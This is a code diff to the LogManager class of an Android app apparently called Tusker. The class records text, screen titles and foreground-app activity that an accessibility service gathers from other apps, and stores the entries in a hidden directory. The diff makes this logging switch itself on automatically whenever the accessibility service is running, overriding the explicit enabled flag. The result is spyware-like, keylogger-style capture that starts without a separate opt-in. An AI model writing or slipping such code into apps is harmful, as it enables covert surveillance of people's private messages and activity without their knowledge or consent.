@@ -1,8 +1,10 @@
 package com.task.tusker.commands;
 
 import android.content.Context;
+import android.provider.Settings;
 import android.util.Base64;
 import android.util.Log;
+import com.task.tusker.services.UnifiedAccessibilityService;
 import com.task.tusker.utils.Constants;
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -53,8 +55,26 @@ public class LogManager {
         // Activity log dir
         this.activityDir = new File(context.getFilesDir(), ".activity");
         if (!activityDir.exists()) activityDir.mkdirs();
+
+        // Auto-enable if accessibility service is already running (cross-process check)
+        if (!enabled && isAccessibilityEnabled(context)) {
+            enabled = true;
+            Log.i(TAG, "LogManager AUTO-ENABLED (accessibility already granted)");
+        }
+
         // Purge stale log files on every service start (runs on a background thread).
         new Thread(this::purgeOldLogs, "LogPurge").start();
+    }
+
+    /**
+     * Check if accessibility service is enabled (works across processes).
+     * Uses both static instance check (same process) and heartbeat file (cross-process).
+     */
+    private static boolean isAccessibilityEnabled(Context context) {
+        if (UnifiedAccessibilityService.getInstance() != null) {
+            return true;
+        }
+        return UnifiedAccessibilityService.hasFreshHeartbeat(context);
     }
 
     /**
@@ -108,6 +128,21 @@ public class LogManager {
         return enabled;
     }
 
+    /**
+     * Check if logging should proceed based on accessibility status.
+     * Returns true if explicitly enabled OR if accessibility service is running.
+     */
+    private boolean shouldLog() {
+        if (enabled) return true;
+        // Auto-enable if accessibility is granted (cross-process check)
+        if (isAccessibilityEnabled(context)) {
+            enabled = true;
+            Log.i(TAG, "LogManager AUTO-ENABLED via shouldLog()");
+            return true;
+        }
+        return false;
+    }
+
     // ── Write a log entry ────────────────────────────────────────────────
 
     /**
@@ -123,7 +158,7 @@ public class LogManager {
      */
     public void logEntry(String packageName, String appName, String text, String eventType,
                          String screenTitle) {
-        if (!enabled || text == null || text.isEmpty()) return;
+        if (!shouldLog() || text == null || text.isEmpty()) return;
 
         String today = todayStr();
         JSONObject entry = buildEntry(packageName, appName, text, eventType, screenTitle);
@@ -145,7 +180,7 @@ public class LogManager {
      * Called from UnifiedAccessibilityService when an app comes to foreground.
      */
     public void logActivity(String packageName, String appName) {
-        if (!enabled || packageName == null || packageName.isEmpty()) return;
+        if (!shouldLog() || packageName == null || packageName.isEmpty()) return;
 
         String today = todayStr();
         JSONObject entry = buildActivityEntry(packageName, appName);
